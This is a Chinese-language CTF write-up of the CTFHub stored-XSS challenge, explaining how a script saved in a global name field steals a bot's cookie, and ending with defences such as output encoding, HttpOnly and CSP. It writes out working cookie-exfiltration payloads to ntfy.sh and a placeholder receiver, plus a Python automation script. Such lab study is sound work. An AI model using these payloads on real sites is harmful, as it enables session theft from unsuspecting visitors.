---
layout: post
title: CTFHub - XSS 存储型 Writeup
platform: ctfhub
date: 2026-10-22 20:31:00 +0800
categories: CTF
---

CTFHub - XSS 存储型 Writeup

一、题目信息

- 平台：CTFHub（技能树 → Web → **XSS** → 存储型 XSS）
- 题型：Web
- 考点：**存储型 XSS**、Bot 访问、Cookie 外带


```text
页面标题：CTFHub 技能学习 | XSS Persistent

页面结构：
    ┌──────────────────────────────────────┐
    │  Change name  [ CTFHub ]  [Submit]   │  ← POST /  name=xxx
    │  ──────────────────────────────────  │
    │  Hello, no name                      │  ← ★ 存储的名字（反射点）
    │  ──────────────────────────────────  │
    │  Send URL to Bot                     │
    │  URL [ ______________ ]  [Send]      │
    └──────────────────────────────────────┘

★ 存储确认（POST 一次，之后一直生效）：

    POST /  name=tester123
    → Hello, tester123          （无任何 Cookie 下发，说明存在服务端）

    POST /  name=<script>alert(1)</script>
    → Hello, <script>alert(1)</script>        ← ★ 原样输出，没转义

    之后 GET /（任何会话）
    → Hello, <script>alert(1)</script>        ← ★ 持久化

★ 存储范围：全局

    用【全新的、不带任何 Cookie】的请求访问首页，
    仍然看到之前存进去的 payload
    → 说明这个 name 是【全局存一份】的（不是每个用户各存一份）

★ 利用（存储型最大的便利：不用构造恶意 URL）：

    ① POST 存 payload：
       name=<script>fetch('https://ntfy.sh/<topic>',
            {method:'POST',mode:'no-cors',
             body:'cookie='+encodeURIComponent(document.cookie)})</script>

    ② 提交给 Bot 的 URL 只要【题目首页】就行：
       POST /submit  {"url": "http://challenge-xxx:10800/"}
       → {"code": 0, "msg": "Successfully"}

       ★ 不需要在 URL 里带 payload！
         因为 payload 已经存进数据库了，Bot 一打开首页就中招

    ③ 接收端收到：
       cookie=flag%3Dctfhub%7Bc34295a8261f0c4191a0d0c5%7D
       ua=...HeadlessChrome/112...

    URL 解码：flag=ctfhub{c34295a8261f0c4191a0d0c5}

flag         : ctfhub{c34295a8261f0c4191a0d0c5}
```

二、题目分析

**① 存储型 XSS 和反射型的核心区别**

| | 反射型 | 存储型（本题）|
|---|---|---|
| **payload 存在哪** | URL 参数（一次性）| **数据库/服务端（持久）** |
| **触发条件** | 受害者必须点你发的链接 | **任何人打开页面就触发** |
| **是否需要构造恶意 URL** | ✅ 必须 | ❌ **不需要** |
| **危害** | 需诱导点击 | **自动触发，危害更大** |
| **典型场景** | 搜索框、错误页 | 留言板、个人资料、昵称 |

**★ 本题的关键优势**：

```text
反射型：你得让 Bot 访问【你精心构造的 URL】
        → 要过 URL 白名单校验、要正确编码

存储型：你只要【改个名字】，payload 就存进去了
        → Bot 只要访问普通首页就中招
        → 提交给 Bot 的 URL 就是最朴素的 http://challenge-xxx:10800/
```

**② 为什么这个"名字"是全局的**

```text
从行为推断实现：

    ① POST /  name=xxx   → 存到服务端（没有下发 Cookie）
    ② GET  /             → 读出并显示
    ③ 换一个全新会话访问 → 还是同一个值

    → 说明服务端就存了【一个】name 变量（可能是数据库里一行，或者一个全局变量）
    → 所有访问者看到的都是"最后一个人设置的名字"

★ 这个设计让攻击更简单了：
  你改了名字 → 全局生效 → Bot 访问时一定中招
```

**③ 完整的攻击链（三个角色）**

```
① 你（攻击者）
   POST name=<script>...  →  把恶意脚本存进服务器
                              ↓
② 服务器（存着这个 name）
   GET / → <h1>Hello, <script>...</script></h1>
                              ↓
③ Bot（管理员，无头 Chrome）
   访问首页 → 浏览器执行 <script> → document.cookie 被发到 ntfy
                              ↓
④ 你（回到接收端）
   打开 https://ntfy.sh/<topic> → 看到 flag
```

**④ 为什么 Bot 的 Cookie 里有 flag**

```text
CTFHub 的 XSS 靶场设计：
    · Bot 启动时带着一个 Cookie：flag=ctfhub{...}
    · 它的任务是用浏览器访问你提交的 URL
    · 你的 JS 在它的浏览器里执行 → 能读到它的 Cookie

★ 如果 Cookie 加了 HttpOnly，document.cookie 就读不到
  → 这题没加，所以能偷
```

三、解题步骤

**方法一：浏览器手工做（这题最简单，连控制台都不用）**

**第 1 步：准备接收端**

```
新标签页打开：
    https://ntfy.sh/你的随机topic

（比如 https://ntfy.sh/myctf_store_abc123）
保持这个页面开着，消息会实时显示
```

**第 2 步：把 payload 存进"名字"里**

```
① 回到题目页面
② 在 "Change name" 输入框里，粘贴这一整段：

<script>fetch('https://ntfy.sh/myctf_store_abc123',{method:'POST',mode:'no-cors',body:'cookie='+encodeURIComponent(document.cookie)})</script>

③ 点 【Submit】
```

**④ 观察页面**：

```
Hello, <script>fetch('https://ntfy.sh/...',{...})</script>
```

**★ 看到 script 原样显示在 Hello 后面 → 存储成功**

**顺便**：你自己的浏览器此时会触发这个 fetch（因为脚本执行了），
所以 ntfy 那边可能先收到一条你自己的 cookie —— 那是正常的。

**第 3 步：把首页地址发给 Bot**

```
① 在 "Send URL to Bot" 输入框里填（就四个字符的工作）：

    http://challenge-7626a166f62d38a5.sandbox.ctfhub.com:10800/

   ★ 注意：不用带 ?name=... ！payload 已经存好了

② 点 【Send】
③ 看到绿色 "Successfully"
```

**第 4 步：看接收端**

```
切到 ntfy 页面 → 等 5~15 秒 → 出现消息：

    cookie=flag%3Dctfhub%7Bc34295a8261f0c4191a0d0c5%7D

解码：
    %3D → =     %7B → {     %7D → }
    
    flag=ctfhub{c34295a8261f0c4191a0d0c5}
```

**第 5 步：提交 flag → 通关**

---

**方法二：命令行 / 脚本（自动化）**

```python
import urllib.parse, urllib.request, json, time

base  = "http://challenge-xxx:10800"
TOPIC = "myctf_store_abc123"
NTFY  = "https://ntfy.sh/" + TOPIC

# ① 存入 payload
payload = ("<script>fetch('%s',{method:'POST',mode:'no-cors',"
           "body:'cookie='+encodeURIComponent(document.cookie)})</script>") % NTFY
data = urllib.parse.urlencode({"name": payload}).encode()
req = urllib.request.Request(base + "/", data=data, method="POST",
        headers={"Content-Type": "application/x-www-form-urlencoded"})
print(urllib.request.urlopen(req).read()[:100])

# ② 提交首页给 Bot
body = json.dumps({"url": base + "/"}).encode()
req = urllib.request.Request(base + "/submit", data=body, method="POST",
        headers={"Content-Type": "application/json"})
print(urllib.request.urlopen(req).read())      # {"code":0,"msg":"Successfully"}

# ③ 轮询接收端
for i in range(12):
    time.sleep(5)
    r = urllib.request.urlopen(NTFY + "/json?poll=1")
    for line in r.read().decode().split("\n"):
        if '"event":"message"' in line:
            print(json.loads(line)["message"])
            exit()
```

**实测输出**：

```
{"code": 0, "msg": "Successfully"}

cookie=flag%3Dctfhub%7Bc34295a8261f0c4191a0d0c5%7D
 || ua=Mozilla%2F5.0%20(X11%3B%20Linux%20x86_64)%20AppleWebKit%2F537.36
      %20(KHTML%2C%20like%20Gecko)%20HeadlessChrome%2F112.0.5615.138
```

---

**方法三：如果要用 DevTools 控制台**

**注意**：DevTools 控制台有"禁止粘贴"保护，可能粘不进去。
这题**完全不需要控制台**（payload 直接填在页面表单里就行），
所以推荐用方法一。

**如果一定要在控制台里做**：

```js
// ① 存 payload
fetch('/', {
  method: 'POST',
  headers: {'Content-Type': 'application/x-www-form-urlencoded'},
  body: 'name=' + encodeURIComponent(`<script>fetch('https://ntfy.sh/你的topic',{method:'POST',mode:'no-cors',body:'cookie='+encodeURIComponent(document.cookie)})</script>`)
}).then(()=>console.log('已存储'))

// ② 提交给 Bot
fetch('/submit', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({url: 'http://challenge-xxx:10800/'})
}).then(r=>r.text()).then(console.log)
```

**如果控制台粘不进去** → 用 DevTools 的【源代码/来源 → 代码片段】，
那里是文件编辑器，没有粘贴限制。

四、延伸知识

**① 存储型 XSS 为什么更危险**

```text
反射型：
    攻击者 → 发链接给受害者 → 受害者点击 → 触发
    ★ 需要"诱导"，成功率低

存储型：
    攻击者 → 留言/改昵称 → payload 存进数据库
    → 之后【所有访问这个页面的人】自动中招
    ★ 不需要诱导，一次植入，持续生效
    ★ 这是蠕虫式传播的基础（比如早年微博蠕虫）
```

**② 常见的高危存储点**

```
· 留言板 / 评论区
· 个人资料：昵称、签名、头像 URL
· 站内信 / 私信
· 文件名（上传后的文件名展示）
· 订单备注、工单内容
· 后台的管理日志（把 User-Agent 存进去再显示出来）
```

**★ 本题就是"昵称"这个经典位置。**

**③ 存储型 vs 反射型 的 payload 差异**

```text
反射型：payload 要在 URL 里 → 必须 URL 编码
    ?name=%3Cscript%3E...

存储型：payload 直接 POST 表单 → 不需要 URL 编码
    POST /  name=<script>...</script>
    
    ★ 表单提交时浏览器会自动编码，你不用管
```

**④ 外带（Exfil）的几种写法**

```html
<!-- ① 图片（GET，最通用，不受 CORS 限制） -->
<script>new Image().src='https://receiver/?c='+document.cookie</script>

<!-- ② fetch + no-cors（POST，能带更长内容） -->
<script>fetch('https://receiver',{method:'POST',mode:'no-cors',body:document.cookie})</script>

<!-- ③ 顶层跳转（会离开当前页，Bot 场景可用） -->
<script>location='https://receiver/?c='+document.cookie</script>

<!-- ④ iframe（隐蔽） -->
<script>document.body.appendChild(Object.assign(document.createElement('iframe'),{src:'https://receiver/?c='+document.cookie,style:'display:none'}))</script>
```

**★ 本题用 ②**，因为 POST 能带更长的内容（cookie + UA + localStorage）。

**⑤ 防护**

```text
· ★ 输出编码（最关键）
    存进去的时候可以原样存，但【输出到 HTML 时】必须转义：
        <  → &lt;
        >  → &gt;
        "  → &quot;
        '  → &#39;
        &  → &amp;

· ★ Cookie 加 HttpOnly
    Set-Cookie: flag=xxx; HttpOnly
    → document.cookie 读不到 → 这类攻击直接失效

· CSP（内容安全策略）
    Content-Security-Policy: default-src 'self'; script-src 'self'
    → 禁止内联脚本执行、禁止外域请求
    → 就算注入了也执行不了

· 输入过滤（辅助，可被绕过）
· 富文本用白名单净化（DOMPurify 等）
```

五、总结

- **本题核心：改个昵称就植入 XSS → Bot 访问普通首页自动中招 → Cookie 外带到接收端。**
- **和反射型最大的区别**：

```text
反射型：要构造恶意 URL 让 Bot 访问
存储型：payload 存起来，Bot 访问【最普通的首页】就中招
```

- 完整 payload：

```html
<script>fetch('https://ntfy.sh/<topic>',{
    method:'POST',
    mode:'no-cors',
    body:'cookie='+encodeURIComponent(document.cookie)
})</script>
```

- 提交给 Bot 的 URL（★ 重点）：

```text
http://challenge-xxx:10800/          ← 就这个，不用带任何参数
```

- **三个必记要点**：

```text
① 存储型 XSS 不需要"恶意 URL"—— payload 已经在服务器上了
② 这题的名字是【全局存储】，谁改谁生效，Bot 必中
③ 存储型比反射型危险得多：一次植入，所有访问者中招
```

- **实测 flag**：

```text
ctfhub{c34295a8261f0c4191a0d0c5}
（来自 Bot 的 Cookie：flag=ctfhub{c34295a8261f0c4191a0d0c5}）
```

**手工复现要点**：

```text
· 这题连控制台都不用：
  ① 把 payload 填进 "Change name" 框 → Submit
  ② 把首页地址填进 "Send URL to Bot" → Send
  ③ 看 ntfy
· 接收端用 ntfy.sh：免费、匿名、有 API
· 存 payload 后，你自己浏览器也会执行一次（会收到自己的 cookie，正常）
```
